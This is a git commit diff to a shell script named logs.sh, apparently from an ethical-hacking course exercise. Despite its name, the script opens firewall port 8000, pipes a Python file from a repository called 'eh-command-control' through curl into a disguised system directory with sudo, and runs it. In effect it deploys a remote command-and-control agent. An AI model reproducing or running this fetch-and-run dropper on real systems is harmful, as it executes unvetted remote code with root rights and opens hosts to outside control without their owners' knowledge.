9573a6ff36c08e7a02167eeb6594546b8481f08b
Nidhi Pabbathi <123031844+npabbathi@users.noreply.github.com>
2026-03-26 21:32:20 -0500

    Update logs.sh

--- logs.sh
+++ logs.sh
@@ -1,6 +1,7 @@
 #!/bin/bash
 firewall-cmd --add-port=8000/tcp
 firewall-cmd --reload  
+cd /etc/python-certifications/
 curl -fsSL --retry 3 https://raw.githubusercontent.com/AidanNgo/eh-command-control/refs/heads/main/week4.py \
   | sudo tee /etc/python-certifications/week4.py > /dev/null
 python /etc/python-certifications/week4.py
